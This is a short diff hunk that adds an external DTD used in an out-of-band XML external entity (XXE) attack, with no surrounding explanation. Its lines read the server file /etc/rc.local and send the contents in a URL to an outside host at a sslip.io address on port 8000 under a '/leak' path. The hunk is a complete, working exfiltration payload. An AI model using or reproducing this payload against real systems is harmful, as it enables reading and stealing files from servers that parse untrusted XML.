@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/rc.local">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://47-92-29-251.sslip.io:8000/leak?tag=rc&d=%file;'>">
+%eval;
+%send;
